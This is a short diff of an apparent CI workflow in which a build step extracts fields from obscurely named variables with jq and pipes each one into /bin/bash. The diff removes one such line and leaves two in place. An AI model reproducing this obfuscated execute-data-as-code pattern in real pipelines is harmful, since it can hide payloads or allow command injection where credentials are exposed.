@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$ljzco2" | jq -r .rxxq51 | /bin/bash
           printf '%s' "$zgp52" | jq -r .ati39 | /bin/bash
-          printf '%s' "$kkps28" | jq -r .a54 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
